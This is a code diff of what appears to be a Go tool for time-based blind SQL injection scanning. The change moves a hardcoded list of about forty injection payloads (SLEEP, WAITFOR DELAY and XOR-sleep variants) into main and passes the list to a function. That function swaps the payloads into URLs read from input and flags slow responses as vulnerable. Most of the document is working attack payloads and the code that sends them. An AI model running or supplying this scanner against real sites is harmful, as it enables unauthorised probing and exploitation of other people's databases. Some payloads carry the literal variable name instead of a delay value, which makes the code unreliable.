@@ -16,8 +16,6 @@ const (
 	reset = "\033[0m"
 )
 
-
-
 func medirTempoRequisicao(url string) float64 {
 	inicio := time.Now()
 
@@ -45,58 +43,16 @@ func replacePayloads(baseURL string, payloads []string) []string {
 	return resultURLs
 }
 
-
-func testarURLs(tempoSQLi float64) {
+func testarURLs(tempoSQLi float64, payloads []string) {
 	scanner := bufio.NewScanner(os.Stdin)
 
-	payloads := []string{
-	"0'XOR(if(now()=sysdate(),sleep(tempoSQLi),0))XOR'Z",
-	"0\\\"XOR(if(now()=sysdate(),sleep(tempoSQLi),0))XOR\\\"Z",
-	"1 or sleep(tempoSQLi)#",
-	"1) or sleep(tempoSQLi)#",
-	"1) or sleep(tempoSQLi)#",
-	"1)) or sleep(tempoSQLi)#",
-	"1') WAITFOR DELAY 'tempoSQLi' AND ('1337'='1337",
-	"1) WAITFOR DELAY 'tempoSQLi' AND (1337=1337",
-	"';%5waitfor%5delay%5'tempoSQLi'%5--%5",
-	"AND (SELECT * FROM (SELECT(SLEEP(tempoSQLi)))bAKL) AND 'vRxe'='vRxe",
-	"AND (SELECT * FROM (SELECT(SLEEP(tempoSQLi)))nQIP)",
-	"AND (SELECT * FROM (SELECT(SLEEP(tempoSQLi)))nQIP)#",
-	"AND (SELECT * FROM (SELECT(SLEEP(tempoSQLi)))nQIP)--",
-	"AND (SELECT * FROM (SELECT(SLEEP(tempoSQLi)))YjoC) AND '%'='",
-	"AnD SLEEP(tempoSQLi)",
-	"AnD SLEEP(tempoSQLi)#",
-	"AnD SLEEP(tempoSQLi)--",
-	"' AnD SLEEP(tempoSQLi) ANd '1",
-	"and WAITFOR DELAY 'tempoSQLi'",
-	"and WAITFOR DELAY 'tempoSQLi'--",
-	") IF (1=1) WAITFOR DELAY 'tempoSQLi'--",
-	"ORDER BY SLEEP(tempoSQLi)",
-	"ORDER BY SLEEP(tempoSQLi)#",
-	"ORDER BY SLEEP(tempoSQLi)--",
-	" or sleep(tempoSQLi)#",
-	" or sleep(tempoSQLi)=",
-	") or sleep(tempoSQLi)=",
-	")) or sleep(tempoSQLi)=",
-	"' or sleep(tempoSQLi)#",
-	"' or sleep(tempoSQLi)='",
-	"') or sleep(tempoSQLi)='",
-	"')) or sleep(tempoSQLi)='",
-	"or SLEEP(tempoSQLi)",
-	"or SLEEP(tempoSQLi)#",
-	"or SLEEP(tempoSQLi)--",
-	"or SLEEP(tempoSQLi)=",
-	"or SLEEP(tempoSQLi)='",
-	"or WAITFOR DELAY 'tempoSQLi'",
-	"or WAITFOR DELAY 'tempoSQLi'--"
-	}
-	
 	for scanner.Scan() {
-		resultURLs := scanner.Text()
+		url := strings.TrimSpace(scanner.Text())
+
+		// Substituir "FUZZ" pelos payloads nas URLs
+		resultURLs := replacePayloads(url, payloads)
+
 		for _, url := range resultURLs {
-			// Remover espaços em branco e quebras de linha
-			url = strings.TrimSpace(url)
-	
 			if medirTempoRequisicao(url) >= tempoSQLi {
 				fmt.Printf("%sVulnerable: %s%s - {%f}\n", red, url, reset, medirTempoRequisicao(url))
 			} else {
@@ -117,7 +73,47 @@ func main() {
 		os.Exit(1)
 	}
 
+	payloads := []string{
+			"0'XOR(if(now()=sysdate(),sleep(tempoSQLi),0))XOR'Z",
+			"0\\\"XOR(if(now()=sysdate(),sleep(tempoSQLi),0))XOR\\\"Z",
+			"1 or sleep(tempoSQLi)#",
+			"1) or sleep(tempoSQLi)#",
+			"1) or sleep(tempoSQLi)#",
+			"1)) or sleep(tempoSQLi)#",
+			"1') WAITFOR DELAY 'tempoSQLi' AND ('1337'='1337",
+			"1) WAITFOR DELAY 'tempoSQLi' AND (1337=1337",
+			"';%5waitfor%5delay%5'tempoSQLi'%5--%5",
+			"AND (SELECT * FROM (SELECT(SLEEP(tempoSQLi)))bAKL) AND 'vRxe'='vRxe",
+			"AND (SELECT * FROM (SELECT(SLEEP(tempoSQLi)))nQIP)",
+			"AND (SELECT * FROM (SELECT(SLEEP(tempoSQLi)))nQIP)#",
+			"AND (SELECT * FROM (SELECT(SLEEP(tempoSQLi)))nQIP)--",
+			"AND (SELECT * FROM (SELECT(SLEEP(tempoSQLi)))YjoC) AND '%'='",
+			"AnD SLEEP(tempoSQLi)",
+			"AnD SLEEP(tempoSQLi)#",
+			"AnD SLEEP(tempoSQLi)--",
+			"' AnD SLEEP(tempoSQLi) ANd '1",
+			"and WAITFOR DELAY 'tempoSQLi'",
+			"and WAITFOR DELAY 'tempoSQLi'--",
+			") IF (1=1) WAITFOR DELAY 'tempoSQLi'--",
+			"ORDER BY SLEEP(tempoSQLi)",
+			"ORDER BY SLEEP(tempoSQLi)#",
+			"ORDER BY SLEEP(tempoSQLi)--",
+			" or sleep(tempoSQLi)#",
+			" or sleep(tempoSQLi)=",
+			") or sleep(tempoSQLi)=",
+			")) or sleep(tempoSQLi)=",
+			"' or sleep(tempoSQLi)#",
+			"' or sleep(tempoSQLi)='",
+			"') or sleep(tempoSQLi)='",
+			"')) or sleep(tempoSQLi)='",
+			"or SLEEP(tempoSQLi)",
+			"or SLEEP(tempoSQLi)#",
+			"or SLEEP(tempoSQLi)--",
+			"or SLEEP(tempoSQLi)=",
+			"or SLEEP(tempoSQLi)='",
+			"or WAITFOR DELAY 'tempoSQLi'",
+			"or WAITFOR DELAY 'tempoSQLi'--"
+	}
 
-
-	testarURLs(tempoSQLi)
+	testarURLs(tempoSQLi, payloads)
 }
